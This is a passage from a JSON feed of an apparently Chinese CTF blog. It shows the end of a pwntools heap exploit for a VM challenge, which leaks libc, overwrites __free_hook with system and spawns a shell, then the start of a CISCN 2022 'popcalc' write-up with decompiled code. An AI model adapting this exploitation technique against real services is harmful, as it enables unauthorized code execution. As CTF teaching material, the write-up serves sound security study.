class=\"params\">wh,content</span>):\t\t\t\t\t<span class=\"comment\">#   0&lt;=  offset  &lt;=0xffffffff</span></span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0xda</span> + wh*<span class=\"number\">0x100</span>+content*<span class=\"number\">0x10000000000</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decX</span>():</span><br><span class=\"line\">\tpaylaod = <span class=\"number\">0x0400000000000000</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">incy</span>():</span><br><span class=\"line\">\tpayload = <span class=\"number\">0x0800000000000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">code = []</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x10</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x20</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x30</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x40</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x50</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x60</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x70</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x80</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x90</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xa0</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xb0</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xc0</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xd0</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x4</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x20</span>,<span class=\"number\">0xd1</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x10</span>,<span class=\"number\">0xee</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x8</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x10</span>,<span class=\"number\">0xee</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xf0</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x8</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x0</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x20</span>,<span class=\"number\">0x41</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xf0</span>))</span><br><span class=\"line\">code.append(reset())</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(code))</span><br><span class=\"line\">nums = <span class=\"built_in\">len</span>(code)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Xn = <span class=\"number\">10</span></span><br><span class=\"line\">Yn = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x0139D&#x27;)\t\t\t\t#set </span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x00164E&#x27;)\t\t\t\t#getcode</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x165e&#x27;)\t\t\t\t#operation</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x013B7&#x27;)</span></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;size X:&quot;</span>,<span class=\"built_in\">str</span>(Xn))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;size Y:&quot;</span>,<span class=\"built_in\">str</span>(Yn))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;How many codes do you want to set?&quot;</span>,<span class=\"built_in\">str</span>(nums))</span><br><span class=\"line\"></span><br><span class=\"line\">x=<span class=\"number\">0</span></span><br><span class=\"line\">y=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nums):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;X:&quot;</span>,<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Y:&quot;</span>,<span class=\"built_in\">str</span>(y))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Code:&quot;</span>,<span class=\"built_in\">str</span>(code[i]))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(code[i])+<span class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\">\tx +=<span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x  == Xn:</span><br><span class=\"line\">\t\ty+=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tx=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Start X:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Start Y:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">fake = p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">0xe</span>,<span class=\"number\">1</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,fake*i)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendafter(<span class=\"string\">&quot;content:&quot;</span>,<span class=\"string\">b&#x27;X&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;X&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">libc_base = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3ebca0</span></span><br><span class=\"line\">free_hook = libc_base + <span class=\"number\">0x3ed8e8</span></span><br><span class=\"line\">system = libc_base + <span class=\"number\">0x04f420</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] libc_base : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(libc_base)+<span class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] free_hook : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(free_hook)+<span class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] system : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(system)+<span class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">1</span>+p64(<span class=\"number\">0x31</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span>+p64(<span class=\"number\">0x41</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">newcode = []</span><br><span class=\"line\">key=free_hook-<span class=\"number\">0x8</span></span><br><span class=\"line\"></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x1</span>))</span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x1</span>))</span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x20</span>,<span class=\"number\">0x01</span>))</span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x28</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x29</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x2a</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x2b</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x2c</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\">key = key&gt;&gt;<span class=\"number\">8</span></span><br><span class=\"line\">newcode.append(write(<span class=\"number\">0x2d</span>,key&amp;<span class=\"number\">0xff</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">newcode.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\">newcode.append(malloc(<span class=\"number\">0x30</span>))\t\t<span class=\"comment\">#origin</span></span><br><span class=\"line\">newcode.append(malloc(<span class=\"number\">0x30</span>))\t\t<span class=\"comment\">#aimedn</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;How many codes do you want to set? &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(newcode)))</span><br><span class=\"line\">x=<span class=\"number\">0</span></span><br><span class=\"line\">y=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(newcode)):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;X:&quot;</span>,<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Y:&quot;</span>,<span class=\"built_in\">str</span>(y))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Code:&quot;</span>,<span class=\"built_in\">str</span>(newcode[i]))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(newcode[i])+<span class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\">\tx +=<span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x  == Xn:</span><br><span class=\"line\">\t\ty+=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tx=<span class=\"number\">0</span></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Start X:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;brva 0x0139D&#x27;</span>)\t\t\t\t<span class=\"comment\">#set </span></span><br><span class=\"line\">pause()</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Start Y:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x1439&#x27;)\t\t\t# malloc printf(&quot;you say&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,<span class=\"string\">b&#x27;aaaaaa\\n&#x27;</span>)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>+p64(system))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"备注\"><a class=\"markdownIt-Anchor\" href=\"#备注\">#</a> 备注：</h2>\n<p>因为博客环境搭建问题，不能上传图片和文件包，需要题目及 ida 的逆向文件的朋友，可联系 QQ3263367390</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/06/19/ciscn-2022-popcalc/",
            "url": "http://example.com/2022/06/19/ciscn-2022-popcalc/",
            "title": "ciscn_2022_popcalc",
            "date_published": "2022-06-19T08:41:12.000Z",
            "content_html": "<h1 id=\"ciscn_2022-popcalc\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2022-popcalc\">#</a> CISCN_2022   popcalc</h1>\n<p>一道 vm 的题目。一开始出题人就搞活，之前也遇到过几次，这次也是稍微学到了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// [rsp+10h] [rbp-60h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> **dest; <span class=\"comment\">// [rsp+18h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> src[<span class=\"number\">56</span>]; <span class=\"comment\">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v9; <span class=\"comment\">// [rsp+58h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v9 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  dest = (<span class=\"type\">void</span> **)mmap((<span class=\"type\">void</span> *)<span class=\"number\">0xDEAD0000</span>LL, <span class=\"number\">0x30</span>uLL, <span class=\"number\">3</span>, <span class=\"number\">33</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  sub_401286(src);</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(dest, src, <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  v6 = read(<span class=\"number\">0</span>, dest[<span class=\"number\">2</span>], <span class=\"number\">0x10000</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v6 / <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = *((_DWORD *)dest[<span class=\"number\">2</span>] + i) - <span class=\"number\">49</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 &lt;= <span class=\"number\">8</span> )</span><br><span class=\"line\">      __asm &#123; jmp     rax &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sub_4012FC(src);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//汇编代码</span></span><br><span class=\"line\">.text:<span class=\"number\">00000000004014F</span>1                 lea     rdx, unk_402010</span><br><span class=\"line\">.text:<span class=\"number\">00000000004014F</span>8                 add     rax, rdx</span><br><span class=\"line\">.text:<span class=\"number\">00000000004014F</span>B                 db      <span class=\"number\">3</span>Eh</span><br><span class=\"line\">.text:<span class=\"number\">00000000004014F</span>B                 jmp     rax</span><br></pre></td></tr></table></figure>\n<p>修复之后的代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _DWORD *v3; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v4; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v5; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v6; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v7; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v8; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v9; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v10; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v11; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v12; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v13; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v14; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  _DWORD *v15; <span class=\"comment\">// rcx</span></span><br><span class=\"line\">  __int64 v16; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 v17; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v18; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v21; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v22; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v23; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v24; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v25; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v26; <span class=\"comment\">// [rsp+Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v27; <span class=\"comment\">// [rsp+10h] [rbp-60h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v28; <span class=\"comment\">// [rsp+14h] [rbp-5Ch]</span></span><br><span class=\"line\">  __int64 *dest; <span class=\"comment\">// [rsp+18h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> src[<span class=\"number\">56</span>]; <span class=\"comment\">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v31; <span class=\"comment\">// [rsp+58h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v31 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  dest = (__int64 *)mmap((<span class=\"type\">void</span> *)<span class=\"number\">0xDEAD0000</span>LL, <span class=\"number\">0x30</span>uLL, <span class=\"number\">3</span>, <span class=\"number\">33</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  sub_401286(src);</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(dest, src, <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  v27 = read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)dest[<span class=\"number\">2</span>], <span class=\"number\">0x10000</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v27 / <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( *(_DWORD *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">        v21 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v21 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v21 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v3 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v3 = sub_4013AC(dest);</span><br><span class=\"line\">        v4 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v4 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)dest[<span class=\"number\">3</span>] + *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;2&#x27;</span>:</span><br><span class=\"line\">        v22 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v22 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v22 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v5 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v5 = sub_4013AC(dest);</span><br><span class=\"line\">        v6 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v6 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)dest[<span class=\"number\">3</span>] - *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span 